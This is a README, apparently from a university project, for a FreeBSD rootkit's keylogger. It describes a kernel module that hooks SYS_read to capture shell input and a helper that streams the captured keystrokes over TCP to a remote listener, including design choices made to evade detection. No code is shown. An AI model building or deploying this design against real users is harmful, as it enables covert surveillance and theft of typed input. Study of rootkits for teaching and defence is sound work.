# R00TB33R

## Installation

## Detection


## Remote



## Keylogger

The logger captures stdin read activity on the FreeBSD target ($TARGET) via a kld and streams those bytes over TCP to a collector/listener ($REMOTE) via a user-space helper (log-helper) invoked through the ./log <IP> wrapper. The module hooks SYS_read and specifically targets stdin so only normal shell input is captured while prompts that read directly from /dev/tty such as passwords and stuff are not captured - this could have been done but it would also open up another detection avenue that we would have to consider. 


Synchronized Ring Buffer: Bytes copied from user space via copyin() are pushed into the ring_buffer protected by a kernel mutex. When the ring buffer reaches capacity (next_head == tail), additional incoming bytes are dropped rather than overwriting unread data or overflowing the buffer. A character device (monitor_cdevsw) exposes the buffered bytes to user space. monitor_read() drains ring_buffer into a staging buffer under ring_mtx and transfers data to user space via uiomove() outside the lock so it does not sleep or fault while holding the mutex.

Because read_hook only fires when a process executes read(fd = 0), ./log <IP> is run in the background (./log <IP> &) or in a separate session so the interactive shell remains active and issues read(fd = 0) calls as commands and characters are typed. This is useful for testing.

log-helper opens /dev/sys_monitor (O_RDONLY), connects over TCP to the collector port (4444) with exponential backoff retry and automatic reconnection if the socket drops, and forwards read bytes (byte-by-byte or in configured batches) to the listener.

### Testing Notes
Because read_hook only triggers when a process executes read(fd = 0), running ./log <IP> & in the background—or running ./log <IP> in a separate session/SSH window—keeps the interactive shell active so typing commands and characters issues read(fd = 0) calls that flow through /dev/sys_monitor to the listener.

### Video

Here you can access a video of our keylogger [keyloggerexamplevideo](https://unsw-my.sharepoint.com/:v:/g/personal/z5479498_ad_unsw_edu_au/IQDCpq4GZL_EQJ0vRCJEZK39AbhFxIYRrnVDTFxg6awkqPc?nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJTdHJlYW1XZWJBcHAiLCJyZWZlcnJhbFZpZXciOiJTaGFyZURpYWxvZy1MaW5rIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXcifX0%3D&e=6OrF3k)
